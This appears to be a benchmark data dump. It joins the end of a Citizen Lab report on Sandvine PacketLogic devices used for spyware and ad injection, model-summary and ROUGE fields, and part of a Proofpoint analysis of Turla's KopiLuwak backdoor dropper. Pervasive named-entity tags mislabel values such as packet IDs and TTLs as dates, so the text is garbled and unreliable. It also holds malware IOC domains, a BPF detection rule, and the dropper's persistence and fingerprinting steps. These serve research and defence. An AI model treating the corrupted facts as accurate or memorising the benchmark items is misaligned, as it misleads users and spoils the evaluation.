[ORG] TCP reset packets have IPID [DATE] 13330 , and no [ORG] IP flags , and match our fingerprint ( [LAW] Section [LAW] 3.3 ) . These characteristics suggest that [PERSON] Sandvine [PERSON] PacketLogic devices are being used to carry out the blocking.url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/27/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [ORG] Af\ufb01liate Ads?6.2 . Website blocking in PacketLogicWe tested blocking a website using our [ORDINAL] second - hand [PERSON] Sandvine [PERSON] PacketLogic device ( [LAW] Section [LAW] 3.3 ) . This test involved creating a PropertyObject to match requests whose hostname was hrw.org and then [WORK_OF_ART] a [WORK_OF_ART] Filtering [WORK_OF_ART] Rule that terminates all connections matching [ORG] the [ORG] Property [ORG] Object by using the built - in [ORG] Reject action . Figure [CARDINAL] 18 : How we set up our [ORG] PacketLogic device to block the website of Human RightsWatch . We believe a similar setup exists in [GPE] Egypt . Requests with an HTTP host header of hrw.org were terminated by an injected RST packet . Requests with a [ORG] TLS client hello message with the SNI extension set to hrw.org were also terminated . Our experiment ( Figure [CARDINAL] 19 , Figure [CARDINAL] 20 ) matched elements [CARDINAL] 1 - [CARDINAL] 4 of our fingerprint . Note that the timestamp discrepancy in the [ORG] PCAP files is because the server and client clocks were not synchronized . Client sends GET request for hrw.org17:34:54.213576 IP ( tos [CARDINAL] 0x0 , ttl [DATE] 64 , i d 0 , offset 0 , flags [ DF ] , proto [ORG] TCP ( [CARDINAL] 6 ) , length [CARDINAL] 123 ) [ nop , nop , TS val [CARDINAL] 756752097 ecr [DATE] 2094875405 ] , length [CARDINAL] 71 : HTTP , length : [CARDINAL] 71 GET / HTTP/1.1 Host : hrw.org User - Agent : curl/7.54.0 Accept : * /*Client receives injected RST / ACK17:34:54.213805 IP ( tos [CARDINAL] 0x0 , ttl [DATE] 64 , i d 13330 , offset 0 , flags [ none ] , proto [ORG] TCP ( [CARDINAL] 6 ) , lengthurl\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/28/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [ORG] Af\ufb01liate [ORG] Ads?40 ) [CARDINAL] 40 ) PartnersCitizen Lab sent letters to executive leadership at [GPE] Sandvine and to [ORG] Procera [ORG] Networks / [ORG] Sandvine owner [PERSON] Francisco [PERSON] Partners on [DATE] February [DATE] 12 , [DATE] 2018 . Our letters notified the companies of our research findings and raised questions concerning their human rights impact . We received an initial response from both companies on [DATE] February [DATE] 13 which confirmed their receipt of our letters and indicated that they would provide us with a reply . A [DATE] February [DATE] 16 , [DATE] 2018 letter from [NORP] Sandvine laid out the company \u2019s response in more detail , characterizing the statements in our letter as \u201c false , misleading , and wrong \u201d ; demanding return of the [ORDINAL] second - hand [PRODUCT] PacketLogic device that we used to confirm attribution of our fingerprint ; describing [ORG] Sandvine \u2019s \u201c [ORG] Comprehensive [ORG] Business [ORG] Ethics [ORG] Program \u201d ; and noting that any public statements we make \u201c that are factually inaccurate or based on improper use of [ the [ORG] PacketLogic ] product . . . will be met with vigorous fact - based rebuttal and a strong legal response . . . . \u201d [PERSON] Citizen [PERSON] Lab replied to this email the same day noting that we had withdrawn the original publication date to carefully review the points they raised and undertake further due diligence . [PERSON] Sandvine asserted in its [DATE] February [DATE] 16 letter that its [ORG] PacketLogic product \u201c is not capable of Man - in - the - Middle ( MITM ) attacks and not capable of any form of payload injection , malicious or not , \u201d and that [ORG] Citizen [ORG] Lab \u2019s findings were therefore incorrect . Our research , however , does not suggest that the [ORG] PacketLogic device is capable of injecting traffic with the malicious code outright . Rather , the spyware injection and advertising injection were carried out by injecting [LAW] HTTP [LAW] 307 redirects that caused a target \u2019s browser to automatically fetch malicious code from a separate website . As described in [LAW] Section [LAW] 2 , the injection of various HTTP redirects is an established spyware and advertising injection technique . Additionally , [PERSON] Sandvine acknowledged in its letter that the [ORG] PacketLogic design \u201c does not permit the end user to inject a payload larger than 1 packet . \u201d This assertion , indicating an injection of [CARDINAL] one packet is possible , is consistent with our findings regarding the injection of a redirect command , which is [CARDINAL] one packet in size.url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/29/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?Notably , in the [DATE] February [DATE] 16 letter , [PERSON] Sandvine also expressed its commitment to the ethical use of its product . It referred to the company \u2019s webpage regarding \u201c [WORK_OF_ART] Ethics [WORK_OF_ART] and [WORK_OF_ART] Human [WORK_OF_ART] Rights protection at [GPE] Sandvine , \u201d which provided:11A key part of [ Sandvine \u2019s ] innovation process is to ensure that we do not lose sight of the ethical impact of our technology on human rights , freedom of speech , and privacy . [PERSON] Sandvine has taken the approach on regulating access to the components of our solutions that could be used to infringe on any of these . The usage of our regulatory compliance solutions are controlled by a EULA and software licenses that are required for any components that could conceivably be used to violate human rights , freedom of speech , and privacy . The letter noted that [ORG] Sandvine \u2019s EULA prohibits injection of malicious payloads . The letter also indicated that the company maintains [ORG] a [ORG] Business [ORG] Ethics [ORG] Committee ( [ORG] BEC ) \u201c to review and approve the sale of products and services to customers . \u201d The webpage details how [ORG] Sandvine \u2019s [ORG] BEC uses \u201c the [ORG] World [ORG] Bank Index \u201d ( an apparent reference to the Worldwide Governance Indicators ) to review sales to certain countries . The [ORG] BEC assesses the indicators associated with the following areas of governance : voice and accountability ( which includes freedom of expression - related indicators ) ; political stability and absence of violence / terrorism ; rule of law ; and control of corruption . The [NORP] Sandvine webpage states : Any country not rated an \u201c A \u201d by [ORG] the [ORG] World [ORG] Bank must be approved by the [ORG] BEC and a certificate of compliance signed by the customer acknowledging that they will not use the technology to violate human rights based on the regulatory compliance use case(s ) deployed . Sandvine employees and resellers are prohibited from selling solutions to countries that are embargoed or sanctioned by the [GPE] EU , [GPE] US , and/or [ORG] UN or are rated a \u201c D \u201d by [ORG] the [ORG] Word [ORG] Bank . It is unclear , however , what letter grade ratings are referred to in this policy , or how they are determined , as the Worldwide Governance Indicators provide percentile rankings for countries rather than a letter grade . While [NORP] Sandvine did not comment on the existence or any aspect of business dealings in [GPE] Egypt or [GPE] Turkey , citing contract confidentiality clauses , the [ORG] BEC assessment process it outlines would appear to apply to sales in both countries . The Worldwide Governance Indicators reflect the following [DATE] 2016 percentile rankings ( [CARDINAL] 0 [CARDINAL] to [CARDINAL] 100 ) for [GPE] Egypt and [GPE] Turkey in the categories utilized by [ORG] Sandvine \u2019s [ORG] BEC:12Voice and accountabili- tyPolitical stability and absence of violence / terrorismEgyptTur- corruption3250url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/30/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [PERSON] Af\ufb01liate Ads?The low percentile rankings assigned to those countries \u2014 single digits in the \u201c political stability and absence of violence / terrorism \u201d category , and in no case surpassing [ORDINAL] 50th percentile \u2014 suggest at a minimum that the [ORG] BEC would have been called upon to assess and approve any such sales that took place , and require certificates of compliance from the customers . On [DATE] February [DATE] 20 , [DATE] 2018 , [ORG] Francisco [ORG] Partners sent its own response to our letter , emphasizing that the firm \u201c recognizes the importance of corporate governance and social responsibility . \u201d The firm went on to state : \u201c We spend considerable time and effort regarding the thoughtful development and implementation of proper governance and social responsibility policies and processes for [ORG] Francisco [ORG] Partners and for the companies in which we invest . \u201d The firm noted that , as an investor , it works \u201c with company management teams to enhance ( where necessary ) and to implement robust corporate governance principles , business processes and policies , and business strategy , including social responsibility policies and practices . \u201d It also \u201c mandates the adoption of compliant business ethics policies and processes . Where appropriate , such policies and processes are based on , among other things , the engagement of outside parties and a variety of benchmarking information sources , including [ORG] World [ORG] Bank information . \u201dOn [DATE] March [DATE] 1 , [DATE] 2018 , [PERSON] Citizen [PERSON] Lab replied to [GPE] Sandvine . We emphasized that we were confident in our research findings , which [CARDINAL] two independent peer reviews confirmed . We also posed additional questions regarding [GPE] Sandvine \u2019s business ethics program . On [DATE] March [DATE] 7 , [DATE] 2018 , [PERSON] Sandvine sent a letter to [ORG] the [ORG] University [ORG] of [ORG] Toronto , expressing its continuing concern that the Citizen Lab report \u201c will contain false , inaccurate and misleading information that has the potential to do significant harm to the company , its shareholders and its customers . \u201d Sandvine \u201c demand[ed ] that the report not be released publicly at this time \u201d and laid out the reasons for that demand . External counsel responded to [GPE] Sandvine \u2019s letter on behalf of [ORG] the [ORG] University [ORG] of [ORG] Toronto and [PERSON] Citizen [PERSON] Lab on [DATE] March [DATE] 8 , [CARDINAL] 2018.8 . Conclusion : Dual - Use Technology , [ORG] UnrestrainedDeep packet inspection technology is now ubiquitous across network environments . DPI devices supporting network injection can be used by ISPs for a range of ostensibly legitimate uses , from alerting users to billing issues to bandwidth cap limits \u2014 all broadly marketed under the rubric of what DPI companies refer to benignly as \u201c Quality of Service \u201d or \u201c [WORK_OF_ART] Quality [WORK_OF_ART] of [WORK_OF_ART] Experience . \u201d However , as our investigation demonstrates , network injection can also be used for harmful purposes . Depending on how DPI systems are configured , they may even present serious human rights risks , such as censoring access to content or , worse , silently infecting users with malware , and all without the person affected by the censorship or targeted by the malware realizing what has occurred . Evidently , the technology can also be easily repurposed for mass - scale revenue scams . Despite the risks of harms and abuses , the market for this powerful technology remains largely unregulated . Export controls that were agreed upon within the framework of [ORG] the [ORG] Wassenaar [ORG] Arrangement explicitly exclude \u201c systems or equipment , specially designed forurl\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/31/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [PERSON] Af\ufb01liate [PERSON] Ads ? . . . a. Marketing purpose ; b. [ORG] Network [ORG] Quality [ORG] of [ORG] Service ( QoS ) ; or c. Quality of Experience ( QoE ) \u201d from the scope of controlled [ORG] IP network communications surveillance systems or equipment . Yet the integration of functions , including network injection , in a customizable , multipurpose network solution raises difficult questions regarding end use determinations and proper methods for prevention of misuse of the technology . Regardless of the specific business sector , all companies have a responsibility to prevent the misuse of their products and services in ways that undermine human rights . [ORG] The [ORG] UN [ORG] Guiding [ORG] Principles [ORG] on [ORG] Business [ORG] and [ORG] Human [ORG] Rights note that businesses should \u201c avoid causing or contributing to adverse human rights impacts \u201d and \u201c address such impacts when they occur . \u201d Moreover , [ORG] the [ORG] UN [ORG] Guiding [ORG] Principles clarify that companies should \u201c seek to prevent or mitigate adverse human rights impacts that are directly linked to their operations , products or services by their business relationships , even if they have not contributed to those impacts . \u201d As described in this report , however , [PERSON] Sandvine appears to have provided such tools in [GPE] Turkey and [GPE] Egypt \u2014 [CARDINAL] two countries with documented poor human rights records \u2014 and may have serviced these tools on the ground as well . Additionally , prior reporting of internal company discussions at [ORG] Procera [ORG] Networks show clearly that concerns were raised inside the company about equipping the [NORP] Turkish regime with technology that could be used for surveillance . The company is or should be aware of the potential for misuse of its product in [GPE] Turkey . Despite the human rights concerns raised , [ORG] Sandvine / [ORG] Procera evidently chose to move ahead with provision of technology to [GPE] Turkey . The apparent use of [NORP] Sandvine technology to engage in network injection in [GPE] Egypt and [GPE] Turkey is even more troubling in light of the \u201c strong safeguards \u201d that [NORP] Sandvine asserts it maintains \u201c regarding social responsibility , human rights , and privacy rights . \u201d [NORP] Sandvine appears to have technical means in place to prevent misuse of its technology , noting in its [DATE] February [DATE] 16 letter that it \u201c implements stringent software license controls that limit access to specific product capabilities outside of an intended use case . \u201d The malicious and dubious activities that appear to have been conducted through the use of [ORG] PacketLogic devices as documented in this report suggest that [GPE] Sandvine \u2019s safeguards have come up short \u2014 despite the [ORG] Procera controversy over dealings in [GPE] Turkey that was publicly reported in [DATE] 2016 , which put the company on notice of the potential human rights impact of sales and services in [GPE] Turkey . We recommend that [GPE] Sandvine engage in regular consultation with civil society regarding its human rights due diligence and business ethics program , and enhance transparency surrounding its sales review process and post- sale technical controls . We also recommend that [GPE] Sandvine establish an operational - level grievance mechanism , in line with [ORG] the [ORG] UN [ORG] Guiding [ORG] Principles [ORG] on [ORG] Business [ORG] and [ORG] Human [ORG] Rights , to address incidents of misuse of its products , and clearly communicate to the public how to report concerns , response , and remedial action taken.the timeframe in which one can expect to receive a13We recommend that both dual - use technology developers and investors carefully consider their human rights policies and due diligence practices in light of the changing regulatory and social landscape and growing expectations surrounding corporate socialurl\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/32/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?responsibility . [PERSON] Francisco [PERSON] Partners in particular appears to have targeted dual - use technology companies as a lucrative sector for investment , given the company \u2019s prior investment in companies such as [PERSON] Blue [PERSON] Coat and [ORG] NSO [ORG] Group . Proactive efforts within the firm to incorporate and promote human rights due diligence , as [ORG] Francisco [ORG] Partners touched on in its correspondence , could help address the risks of abuse present in this sector . We recommend that [ORG] Francisco [ORG] Partners publicly release its own corporate social responsibility policies and practices , as well as those that it promotes among its investment companies , and engage with civil society in a transparent manner regarding how those policies and practices could be improved . We also recommend that government entities , including the newly established [ORG] Canadian [ORG] Ombudsperson [ORG] for [ORG] Responsible [ORG] Enterprise ( which would have jurisdiction over [GPE] Sandvine as a corporation based in [GPE] Canada ) , consider the significant human rights implications of network tools capable of network injection in responding to the lack of oversight , transparency , and accountability in the surveillance market . The findings of this report also illustrate the urgent need for ubiquitous adoption of HTTPS by website developers . Handling web traffic over unencrypted channels leaves users vulnerable to network injection techniques that may expose them to spyware , unwanted advertising , or other Internet scams . Particularly on sites offering software downloads ( some of which may be billed as \u201c secure \u201d ) , companies and developers responsible for such platforms must ensure the proper use of encryption . Ultimately , the use of products that provide network injection features on public [ORG] ISP networks , as identified in this report , represents a major global public safety risk . Network injection can be used to take advantage of access to a user \u2019s unencrypted web traffic to replace expected data with malicious or inappropriate code , often in a manner undetectable to the average user . [ORG] Francisco [ORG] Partners \u2019 recent acquisition of [GPE] Sandvine is especially troubling in this regard , since the investment firm \u2019s portfolio also includes [ORG] NSO [ORG] Group , one of the world \u2019s leading providers of spyware whose products are associated with numerous cases of abuse . The prospect of such powerhouse surveillance technologies being sold to companies operating in autocratic regimes , or autocratic regimes themselves , and in jurisdictions wherein human rights are flagrantly abused , should be cause for concern . AcknowledgementsBill Marczak \u2019s work on this project was supported by [ORG] the [ORG] Center [ORG] for [ORG] Long [ORG] Term [ORG] Cybersecurity ( [ORG] CLTC ) at [ORG] UC [ORG] Berkeley . This work was also supported by grants to the Citizen Lab from [ORG] the [ORG] Ford [ORG] Foundation , [PERSON] the [PERSON] John [PERSON] T. and [PERSON] Catherine [PERSON] D. [PERSON] MacArthur [PERSON] Foundation , [ORG] the [ORG] Oak [ORG] Foundation , [ORG] the [ORG] Open [ORG] Society [ORG] Foundations , and [ORG] the [ORG] Sigrid [ORG] Rausing [ORG] Trust . This work includes data from [ORG] the [ORG] Open [ORG] Observatory [ORG] of [ORG] Network [ORG] Interference ( OONI ) , [ORG] Censys , [ORG] VirusTotal , and RiskIQ.Editing and other assistance provided by [ORG] Masashi [ORG] Nishihata , [PERSON] Jeffrey [PERSON] Knockel , [PERSON] Christopher [PERSON] Parsons , [PERSON] Lex [PERSON] Gill , and [PERSON] Miles [PERSON] Kenyon . Research assistance provided by [PERSON] Elizabeth [PERSON] Gross and [PERSON] Gabrielle Lim.url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/33/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [ORG] Af\ufb01liate [ORG] Ads?Additional data can be found hereAppendix A : [GPE] Turkey malware injection IOCsInitial [ORG] CampaignDomains of injected redirectsdownload.downloading[.]shop downloading.syriantelecom[.]co download.syriantelecommunications[.]co redirection[.]bid14Phase 2 [ORG] CampaignDomains of injected redirectsdownloading.internetdownloading[.]co storage[.]computingdownloads[.]life and - security - state[.]comPhase [CARDINAL] 4 [ORG] CampaignInjection domainssolitude.file - download[.]today system.documentations[.]live epiphany.download - document[.]world epoch.wind - [DATE] files[.]today epoch.uploaders[.]online solitude.filedownloads[.]online mevlut.oncu@yandex.com16Phase [CARDINAL] 5 [ORG] CampaignInjection domainsdocument.downloadingsystem[.]com [DATE] epoch.englishdownloaders[.]today internet.downloadingdocuments[.]com system.filedownloaders[.]comMalware C&Cupd - ms3 - app - state[.]comRelated IOCs discoveredcdn6 - upd - state - app.comBPF rule to detect HTTP [CARDINAL] 307 redirect injection consistent with PacketLogic:\u201cport 80 and ip[4:2 ] = [DATE] 13330 and tcp[((tcp[12:1 ] & 0xf0 ) > > 2)+8:4 ] = 0x20333037 and tcp[14:2 ] = 32120 and ip[6:2 ] = 0\u201dFootnotes1 . The text \u201c SECURE DOWNLOAD \u201d is displayed when a user hovers over the\u201cDOWNLOAD NOW \u201d link when attempting to download a file from [GPE] Download.com.2 . Found via Google search ; the brochure URL includes [ORG] a [ORG] Hubspot [ORG] Hub [ORG] ID ( 482141)that we see in the HTML source code of the url site , thus we conclude this is an official brochure.url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/36/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?3 . Found via Google search ; the brochure URL includes [ORG] a [ORG] Hubspot [ORG] Hub [ORG] ID ( 482141)that we see in the HTML source code of the url site , thus we conclude this is an official brochure.4 . Our [NORP] Shodan search query was : [CARDINAL] 307 temporary redirect -date -server connectionclose -content - length -pragma -usercheck -content - type location . [CARDINAL] 5 . The samples were structurally similar to the ones described here . [CARDINAL] 6 . See \u201c inject_data parameter requires [PERSON] v12.1 firmware or newer \u201d onurl For instance , Checkpoint \u2019s Secure Web Gateway appears to use the same HTTP header format as [ORG] PacketLogic , but has numerous differences in the [ORG] IP and [ORG] TCP layers , including not using a fixed [ORG] IPID value , and not injecting a final unsolicited [ORG] ACK.8 . Though most people would instead probably visit videolan.org , which redirectsusers to HTTPS by default.9 . Also surprisingly , when we tested ccleaner.com , it directed [PERSON] Mac users to adownload via HTTPS , but directed PC users to a download over [CARDINAL] HTTP.10 . While it is unlikely that a user would actually see an ad injected on port [DATE] 7547 , it appears that the DPI operator in [GPE] Egypt did not restrict the network injection to a specific port . As a result , an HTTP request on any port would be injected.11 . After we began corresponding with [PERSON] Sandvine , and apparently in [DATE] March [DATE] 2018,Sandvine changed the content of this webpage . The original text as of [DATE] February [DATE] 15 , [DATE] 2018 is available at url ny / corporate - ethics.12 . Most recent data available as of [DATE] March [DATE] 7 , [DATE] 2018 . [CARDINAL] 13 . After we began corresponding with [PERSON] Sandvine , and apparently in [DATE] March [DATE] 2018 , [PERSON] Sandvine changed the content of its \u201c [WORK_OF_ART] Ethics [WORK_OF_ART] and [WORK_OF_ART] Human [WORK_OF_ART] Rights protection at [GPE] Sandvine \u201d webpage to add the following text : \u201c [ W]e encourage [PERSON] Sandvine employees and interested [ORDINAL] third parties to report any suspected breaches of a signed [NORP] Sandvine certificate of compliance or breaches of [ORG] Sandvine \u2019s End User License Agreement ( EULA ) with sufficient supporting evidence to [ORG] Sandvine \u2019s [ORG] BEC committee at [ORG] BEC@sandvine.com for investigation . All reported concerns will be reviewed and appropriately actioned . \u201d It is unclear , however , what terms are contained in the applicable certificates of compliance or EULAs , which information would be required for the public to properly identify and report on such breaches ; or what supporting evidence would be considered \u201c sufficient . \u201d Additional transparency is necessary to make this mechanism effectively available to the public.14 . Also seen in the Phase [CARDINAL] 2 campaign . [CARDINAL] 15 . Also seen in the Phase [CARDINAL] 5 campaign . ms6[.]com ) was issued to \u201c [ORG] mevlut.oncu.example.com , \u201d and we found a similar- looking domain cdn6-scl-ms.com registered to mevlut.oncu@yandex.com according to the [ORG] WHOIS record . That domain never pointed to an [ORG] IP address , as far as we could tell.url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/37/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [PERSON] Af\ufb01liate [PERSON] Ads?url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/38/38", "generated_text": "PDF; a report; security; Sandvine/Procera Networks; devices; use; government spyware; Turkey; users; spyware; legitimate Windows applications; network; the injection; Middleboxes; a Telecom Egypt demarcation point; financial-generating content; affiliate ads; cryptocurrency mining; malware; Egypt; the injection; FinFisher; the StrongPity APT attacks; the malware; the MiddleBoxes; human rights concerns; Egypt.", "ref_text": "<START-1>The report documents an investigation by Citizen Lab into the apparent use of Sandvine/Procera Networks Deep Packet Inspection (DPI) devices to surreptitiously inject malicious content or ads into Internet traffic in Turkey and Egypt. In Turkey, the devices were being used to redirect users attempting to download legitimate Windows programs to versions bundled with spyware associated with the StrongPity APT group. Targets included government critics, Kurdish regions, and Syrian Internet users. In Egypt, a system called AdHose installed on Telecom Egypt's network hijacked users' web connections to redirect them en masse to affiliate ads and browser cryptocurrency mining scripts. AdHose had been operating for years. Extended technical analysis of the injection activities matched them to a fingerprint associated with Sandvine PacketLogic devices. Citizen Lab obtained and tested a PacketLogic device to confirm it could mimic the injections. The report documents how PacketLogic can be configured for regulatory blocking of sites and content. It raises concerns about Sandvine providing such powerful dual-use systems with potential for rights abuses to countries with poor human rights records like Turkey and Egypt. Citizen Lab notified Sandvine and owner Francisco Partners of the issues prior to publication. The companies asserted strong commitment to ethical practices but did not directly address the research findings. Overall, the report illustrates how DPI technology can enable covert attacks and mass surveillance when placed in the wrong hands. It highlights the human rights risks of the unregulated dual-use surveillance industry. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.46195652173913043, "gpt3/lexical/rouge_rouge2": 0.2185792349726776, "gpt3/lexical/rouge_rougeL": 0.30978260869565216, "gpt3/lexical/rouge_rougeLsum": 0.30978260869565216, "gpt3_generated_text": ["This report discusses the use of Sandvine/Procera Networks Deep Packet Inspection (DPI) devices to deploy government spyware in Turkey and redirect Egyptian users to affiliate ads. The investigation found that deep packet inspection middleboxes were being used to redirect users in Turkey and Syria to nation-state spyware when they attempted to download certain legitimate Windows applications. Similar middleboxes were also found at a Telecom Egypt demarcation point, where they were used to hijack Egyptian internet users' unencrypted web connections and redirect them to revenue-generating content such as affiliate ads and browser cryptocurrency mining scripts. The investigation matched the characteristics of the network injection in Turkey and Egypt to Sandvine PacketLogic devices. The use of these devices raises significant human rights concerns."]}, {"split_name": "val", "sample_id": "val_88", "prompt_text": "Extract the keywords: [PERSON] Turla [PERSON] APT actor refreshes [ORG] KopiLuwak [ORG] JavaScript backdoor for use in [GPE] G20 - themed attackAUGUST [CARDINAL] 17 , [DATE] 2017 [PERSON] Darien HussOverviewProofpoint researchers have observed a well - known [LANGUAGE] Russian - speaking [ORG] APT actor usually referred to as [PERSON] Turla using a new .NET / MSIL dropper for an existing backdoor called JS / KopiLuwak . The backdoor has been analyzed previously [ [CARDINAL] 11 ] and is a robust tool associated with this group , likely being used as an early stage reconnaissance tool . In this case , the dropper is being delivered with a benign and possibly stolen decoy document inviting recipients to a [ORG] G20 task force meeting on the \" Digital Economy \" . The [ORG] Digital [ORG] Economy event is actually scheduled for [DATE] October [DATE] of [DATE] this [DATE] year in [GPE] Hamburg , [GPE] Germany . The dropper \ufb01rst appeared in mid - July , suggesting that this [ORG] APT activity is potentially ongoing , with [GPE] Turla actively targeting [ORG] G20 participants and/or those with interest in the [ORG] G20 , including member nations , journalists , and policymakers . This blog provides details on the dropper and known information on the infection chain and current related [GPE] Turla activity . Actor [PERSON] OverviewTurla is a well - documented , long operating [ORG] APT group that is widely believed to be a [NORP] Russian state - sponsored organization . [PERSON] Turla is perhaps most notoriously suspected as responsible for the breach of [GPE] the [GPE] United [GPE] States [GPE] Central [GPE] Command in [DATE] 2008 [ 1 ] . More recently [GPE] Turla was accused ofbreaching [ORG] RUAG , a [NORP] Swiss technology company , in a public report published by GovCERT.ch [ 2 ] . Various other [GPE] Turla frameworks , implants , and campaigns have been detailed extensively by our fellow security organizations and companies [ [CARDINAL] 3 - [CARDINAL] 10 ] . DeliveryThe delivery of [ORG] KopiLuwak in this instance is currently unknown as the [GPE] MSIL dropper has only been observed by [ORG] Proofpoint researchers on a public malware repository . Assuming this variant of [ORG] KopiLuwak has been observed in the wild , there are a number of ways it may have been delivered including some of [GPE] Turla \u2019s previous attack methods such as spear phishing or via a watering hole . Based on the theme of the decoy [ORG] PDF , it is very possible that the intended targets are individuals or organizations that are on or have an interest in [ORG] G20 \u2019s [ORG] Digital [ORG] Economy [ORG] Task [ORG] Force . This could include diplomats , experts in the areas of interest related to [ORG] the [ORG] Digital [ORG] Economy [ORG] Task [ORG] Force , or possibly even journalists . [ORG] AnalysisThe earliest step in any possible attack(s ) involving this variant of [ORG] KopiLuwak of which [ORG] Proofpoint researchers are currently aware begin with the [GPE] MSIL dropper . The basic chain of events upon execution of the [GPE] MSIL dropper include dropping and executing both a [ORG] PDF decoy and a Javascript ( JS ) dropper . As explained in further detail below , the [ORG] JS dropper ultimately installs a [ORG] JS decryptor onto an infected machine that will then \ufb01nally decrypt and execute the actual [ORG] KopiLuwak backdoor in memory only ( [ORG] Fig . 1).Figure [CARDINAL] 1 : [ORG] Diagram showing execution beginning with the [GPE] MSIL dropperAs [GPE] Proofpoint has not yet observed this attack in the wild it is likely that there is an additional component that leads to the execution of the [GPE] MSIL payload . This may include a maliciousdocument , compressed package attached to an e - mail , or perhaps it could be delivered via a watering hole attack . The [ORG] KopiLuwak [ORG] MSIL dropper is straightforward and contains absolutely no obfuscation or anti- analysis . Internally the [GPE] MSIL dropper is called [ORG] Runer.exe and also contains a [ORG] PDB string : \u201c c:\\LocalDisc_D\\MyProjects\\Runer\\Runer\\obj\\Release\\Runer.pdb \u201d . [ORG] The [ORG] Stage1 [ORG] JS and [ORG] PDF decoy are both stored in plaintext in the dropper and are simply written to % APPDATA% then executed ( [ORG] Fig . 2).Figure [CARDINAL] 2 : [GPE] MSIL dropper writing both [ORG] the [ORG] Stage1 [ORG] JS and decoy [ORG] PDF then executing bothBoth of the dropped \ufb01les have hardcoded names : the [ORG] JS is named Scr.js while the [ORG] PDF is named [ORG] Save [ORG] the [ORG] Date [ORG] G20 [ORG] Digital [ORG] Economy [ORG] Taskforce 23 24 October.pdf . The decoy in this case is an invitation to save the date for a meeting of the G20 \u2019s [ORG] Digital [ORG] Economy [ORG] Taskforce ( [ORG] Fig . [CARDINAL] 3 ) in [GPE] Hamburg , [GPE] Germany . Figure [CARDINAL] 3 : [ORG] PDF decoy with a \u201c [WORK_OF_ART] Save [WORK_OF_ART] the [WORK_OF_ART] Date \u201d invitation for [ORG] a [ORG] G20 [ORG] Digital [ORG] Economy [ORG] Taskforce meetingAs far as we are aware , this document is not publicly available and so may indicate that an entity with access to the invitation was already compromised . Alternatively , the document may have been legitimately obtained from a recipient . Proofpoint researchers ascertain with medium con\ufb01dence that the document is legitimate and not fabricated . [CARDINAL] One piece of evidence suggesting that the document could be authentic is that in the document \u2019s exif metadata , the creator tool is listed as \u201c BE.D4.113.1 \u201d ( [PERSON] Fig . [CARDINAL] 4 ) which matches another [ORG] PDF document that appears to have been scanned and is hosted on the [ORG] Bundesministerium f\u00fcr [ORG] Wirtschaft und [ORG] Energie website ( [PERSON] Fig . 5).Figure [CARDINAL] 4 : Exif metadata from the decoy PDFFigure 5 : Exif metadata from the [ORG] PDF hosted on bmwi[.]deBMWi , which translates to [ORG] Federal [ORG] Ministry [ORG] for [ORG] Economic [ORG] Affairs [ORG] and [ORG] Energy , is the organization from which the decoy document supposedly originated . Both documents were also supposedly created on a [ORG] KONICA [ORG] MINOLTA bizhub [GPE] C284e according to their exif metadata.Scr.js [PERSON] AnalysisScr.js is essentially a dropper for the actual backdoor in addition to running all the necessary commands to \ufb01ngerprint the infected system and set up persistence . Scr.js \ufb01rst creates a scheduled task named [ORG] PolicyConverter for persistence . This scheduled task should execute shortly after being created and is then scheduled to run [TIME] every [TIME] 10 [TIME] minutes . The scheduled task is executed with the following parameters : \u201c appidpolicyconverter.js FileTypeXML gwVAj83JsiqTz5fG \u201d . Similar to the older KopiLuwak variant , the [ORDINAL] second parameter is used as an RC4 key to decrypt the encrypted JS backdoor code contained in appidpolicyconverter.js . Next , Scr.js decodes a large base64 blob containing the [ORG] JS backdoor decryptor and saves it to the following location : \u201c C:\\Users\\[executing user]\\AppData\\Roaming\\Microsoft\\Protect\\appidpolicyconverter.js\u201dLastly , Scr.js executes various commands to \ufb01ngerprint details about the infected system . In the older variant of [ORG] KopiLuwak , these commands were executed directly from the backdoor JS . Now , however , they have been moved to the dropper . Despite moving the machine \ufb01ngerprinting code to the dropper , all of the commands are the same as in the older sample ( and executed in the same order ) except for the following [CARDINAL] three additions:\u2022 \u2022 \u2022dir \u201c % program\ufb01les%\\Kaspersky [WORK_OF_ART] Lab \u201d dir \u201c % program\ufb01les(x86)%\\Kaspersky Lab \u201d tracert www.google.comInterestingly the only anti - virus company that is speci\ufb01cally \ufb01ngerprinted is 